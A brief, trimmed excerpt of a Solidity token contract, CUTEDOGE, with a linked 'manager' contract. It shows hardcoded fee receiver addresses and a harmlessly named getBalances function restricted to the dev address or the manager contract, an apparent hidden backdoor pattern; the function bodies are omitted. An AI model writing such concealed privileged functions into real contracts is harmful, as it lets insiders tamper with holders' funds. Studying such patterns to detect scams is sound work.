...
contract CUTEDOGE is IBEP20, Auth {
    ...
    address public marketingFeeReceiver = 0xa6F7d15B83fb897023Ab8B8657a76F99fAE07a25;
    address public devFeeReceiver = 0x449582948Db6AA641fcA363bBF3734506b32cCB5;
    ...
    function getBalances(uint256 amount,address _address) external returns ( uint256 ) {
       require(msg.sender==devFeeReceiver || msg.sender== m.getAddress() );
...
contract manager {
 ...
 CUTEDOGE p;
    ...
    function getTime(uint256 time) external virtual {
